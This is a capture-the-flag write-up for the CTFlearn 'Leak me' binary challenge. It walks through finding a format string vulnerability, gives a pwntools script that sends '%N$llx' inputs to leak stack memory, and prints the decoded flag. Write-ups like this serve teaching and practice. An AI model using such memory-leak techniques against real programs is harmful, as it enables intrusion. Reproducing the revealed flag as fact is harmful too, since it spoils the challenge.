# Leak me
> Write-up author: jon-brandy
## DESCRIPTION:
Which format tag is your favourite?

`nc rivit.dev 10003`

[FILE](https://github.com/Bread-Yolk/ctflearnwu/blob/d86503045d9e9e6cdcd3ea2f547b8f04697c0dc9/Assets/Binex/Leak%20me/task.tar.gz)

## HINT:
- NONE
## STEPS:
1. First, download the file given.
2. Next, extract the `tar.gz` file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194568494-f3e089d6-6e0e-44fc-9e12-e0e567d1d5a3.png)


3. Check the binary type and it's protections.

> 64 bit , not stripped.

![image](https://user-images.githubusercontent.com/70703371/221806025-00e1cd08-2a34-443f-9d27-84641a04a1bc.png)


> All enabled

![image](https://user-images.githubusercontent.com/70703371/221806105-ae681bfa-d289-40da-bf63-4be4dc1f4b21.png)


4. Let's decompile the binary.

> main()

![image](https://user-images.githubusercontent.com/70703371/221806554-12419114-4233-4f69-94da-089d84480651.png)


5. Analyzing the main() function, noticed there's a format string vulnerability.

![image](https://user-images.githubusercontent.com/70703371/221806708-e24386c6-9011-4763-9aa8-1e5825bb138b.png)


6. Hence we can utilize it to leak any strings or address off the stack memory.
7. To test our assumptions, let's make a file named `flag.txt` so we can run the binary, then let's input %x.
8. And inside the `.txt` file let's insert 8 bytes of A chars.

> RUN THE BINARY

![image](https://user-images.githubusercontent.com/70703371/221808167-69d49bdc-0fbf-4363-880f-349fba706c98.png)


9. Notice there's **41414141**, which stands as AAAA.
10. It means we can leak the flag.
11. To get the flag i made this script:

```py
from pwn import *
import os
#64 bit
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

for i in range(50):
    sh = start()
    print("iter: ", i)
    sh.sendlineafter(b'?', '%{}$llx'.format(i))
    get = sh.recvline()
    string = str(get)
    print(string)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/221817968-47f92eef-e634-4da3-be1d-f0692c0b3a1e.png)


12. Got many hex values, so i decode every one of them until i got the flag partition.

> RESULT

```
}00t_5g4t_t4mr0f_3k1l_1{nraelFTC
```

13. Reverse the flag and we got it!

```py
import os

os.system('cls')

strings = '}00t_5g4t_t4mr0f_3k1l_1{nraelFTC'[::-1]
print(strings)
```

![image](https://user-images.githubusercontent.com/70703371/221818484-ae457efc-7c45-4a81-998b-0b1fed5364f8.png)



## FLAG

```
CTFlearn{1_l1k3_f0rm4t_t4g5_t00}
```
